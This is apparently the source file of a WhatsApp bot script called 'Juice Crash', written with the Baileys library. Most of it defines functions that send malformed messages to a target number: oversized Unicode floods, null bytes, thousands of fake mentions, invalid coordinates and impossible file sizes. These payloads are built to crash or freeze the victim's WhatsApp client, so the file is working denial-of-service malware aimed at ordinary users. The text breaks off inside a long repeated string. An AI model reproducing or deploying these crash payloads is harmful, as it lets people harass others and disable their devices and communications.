// 𝘀𝗰 𝗯𝘂𝗴 𝗝𝘂𝗶𝗰𝗲 𝗖𝗿𝗮𝘀𝗵 𝗯𝘆 𝗞𝗶𝗻𝗴 𝗝𝘂𝗶𝗰𝗲
// 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗝𝘂𝗶𝗰𝗲 𝗖𝗿𝗮𝘀𝗵
// 𝗕𝗼𝘁 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4.𝟬.𝟬 𝗩𝗜𝗣
// 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝗞𝗶𝗻𝗴 𝗝𝘂𝗶𝗰𝗲
// 𝗦𝗰𝗿𝗶𝗽𝘁 𝗗𝗮𝘁𝗲 : 𝟭𝟬-𝟮-𝟮𝟬𝟮𝟱
// 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @King_Juice
// 𝗧𝘆𝗽𝗲 𝗦𝗰 : 𝗕𝘂𝗴 𝗩𝗜𝗣 𝗡𝗲𝘄
require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (AndraZyy, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (AndraZyy.user.id.split(':')[0]+'@s.whatsapp.net' || AndraZyy.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await AndraZyy.decodeJid(AndraZyy.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.nomerOwner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await AndraZyy.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));

if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
try {
ppuser = await AndraZyy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
AndraZyy.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
AndraZyy.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
//FUNCTION ABAL ABAL  by Juice ⚡
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			AndraZyy.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄"
          },
          'body': {
            'text': "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄"
          },
          'footer': {
            'text': '⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄', url : , merchant_url :  }"
            }],
            'messageParamsJson': "ꦾ".repeat(50000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await AndraZyy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function trashloc(target) {
      let etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              liveLocationMessage: {
                degreesLatitude: "𝐉𝐮𝐢𝐜𝐞 𝐔𝐢 𝐒𝐲𝐬𝐭𝐞𝐦 🔥",
                degreesLongitude: " 𝐉𝐮𝐢𝐜𝐞 𝐔𝐢 𝐒𝐲𝐬𝐭𝐞𝐦 🔥 ",
                caption: "𝐉𝐮𝐢𝐜𝐞 𝐔𝐢 𝐒𝐲𝐬𝐭𝐞𝐦 🔥" + "\u0000" + "ꦾ".repeat(90000),
                sequenceNumber: "0",
                jpegThumbnail: "",
              },
            },
          },
        }),
        { userJid: target, quoted: qchanel }
      );

      await AndraZyy.relayMessage(target, etc.message, {
        participant: { jid: target },
      });
      console.log(chalk.blue.bold("Juice Send Bug"));
    }
    async function LocSystem(target) {
            let virtex = "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄";
            let memekz = Date.now();

            await AndraZyy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "" + "ꦾ".repeat(50000) + "@X".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "AngeLs`" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
        };
  async function f10(target, Ptcp = false) {
    await AndraZyy.relayMessage(target, {
      extendedTextMessage: {
        text: "`⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
        contextInfo: {
          mentionedJid: ["18492098766@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "18492098766@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "18492098766@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs.readFileSync("./Andrazyy.jpg"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log(chalk.red.bold('💦 𝐉𝐮𝐢𝐜𝐞 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠'))
};
async function XeonXRobust(target, Ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = "ꦽ".repeat(10000);
  await AndraZyy.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/ia8je8.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + ui + jids
          },
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            mentions: ["0@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}
        async function thunderblast_doc(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `Undefined`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷